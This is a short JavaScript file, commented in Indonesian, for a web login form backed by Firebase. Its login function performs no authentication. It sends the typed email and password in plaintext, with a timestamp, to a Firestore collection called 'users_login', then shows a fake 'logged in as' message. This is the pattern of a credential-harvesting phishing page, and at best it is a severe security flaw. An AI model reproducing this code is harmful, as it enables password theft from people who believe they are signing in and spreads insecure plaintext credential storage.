import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-app.js";
import { getFirestore, collection, addDoc } 
from "https://www.gstatic.com/firebasejs/12.12.1/firebase-firestore.js";

// 🔥 CONFIG FIREBASE KAMU
const firebaseConfig = {
  apiKey: "AIzaSyCLedUFy6P5s4hjIQ3hnPWKSiisnBNFY5c",
  authDomain: "ihir-a8304.firebaseapp.com",
  projectId: "ihir-a8304",
  storageBucket: "ihir-a8304.firebasestorage.app",
  messagingSenderId: "610938888136",
  appId: "1:610938888136:web:a38e726bcc4af672b8aafd",
  measurementId: "G-JKVE71X25J"
};

// INIT
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// LOGIN FUNCTION
window.login = async function () {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Isi email & password dulu");
    return;
  }

  try {
    // 🔥 KIRIM KE FIREBASE
    await addDoc(collection(db, "users_login"), {
      email: email,
      password: password,
      waktu: new Date().toISOString()
    });

    // UI SUCCESS
    document.getElementById("loginBox").classList.add("hidden");
    document.getElementById("successBox").classList.remove("hidden");

    document.getElementById("userText").innerText =
      "Login sebagai: " + email;

    console.log("Berhasil masuk Firestore");

  } catch (err) {
    console.error(err);
    alert("Gagal kirim ke Firebase");
  }
};

// LOGOUT
window.logout = function () {
  location.reload();
};